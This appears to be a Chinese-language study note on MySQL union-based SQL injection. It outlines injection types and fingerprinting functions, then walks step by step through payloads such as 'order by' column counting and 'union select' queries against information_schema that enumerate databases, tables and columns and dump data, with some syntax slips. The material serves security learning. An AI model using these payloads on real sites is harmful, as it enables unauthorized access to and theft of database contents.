---
title: SQL联合查询
categories:
  - 学习
tags:
  - SQL注入
abbrlink: 5e22ae9e
---

- **SQL注入分类：**

  - 回显正常---> 联合查询` union select`
  
  - 回显报错-->报错注入：
           
  
    1. `extractvalue()`
    2. `updatexml()`
    3. `floor(rand()\*2)`
  
  - 盲注：
  
    布尔盲注
  
    时间盲注

### SQL联合查询必备条件：

1、界面能够回显数据库查询到的数据（必要条件）；
2、界面回显内容至少能够显示数据库中的某列数据（必要条件）；
3、部分能够直接提供数据库报错内容的回显；

### MYSQL数据库注入-常用函数：
（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 

（2）version() 返回当前数据库的版本 

（3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 

（4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 

（5）@@datadir 数据库路径 

（6）@@version_compile_os 操作系统版本
### SQL（联合）注入流程：
?id=1 and 1=1
1、判断有无闭合 and 1=1 and 1=2 

//结果和第一个一样说明需要闭合，反之无闭合 有闭合则需要用到 --+闭合
2、猜解字段 order by 10 

//采用二分法 3、判断数据回显位置 -1 union select 1，2，3，4，5....

 //参数等号后面加-表示不显示当前数据 4、获取当前数据库名、用户、版本 union select version(),database()，user()，4...... 4、获取全部数据库名

`union select 1,2,(select group\_concat(schema\_name)from information\_schema.schemata)`
5、获取表名

`union select 1,2,(select group\_concat(table\_name)from information\_schema.tables where table\_schema='库名'`
6、获取字段名

`union select 1,2,(select group\_concat(column\_name)from information\_schema.columns where table\_name='表名'`
7、获取数据 

`union select 1,2,(select group_concat(字段1，字段2)from 库名.表名`
函数名称： 函数功能：

查 库：` select schema_name from information_schema.schema`
查 表： `select table_name from information_schema.tables where table_schema=库名`
查 列： `select column_name from information_schema.columns where table_name=表名`
查数据： `select 列名 from 库名.表名`
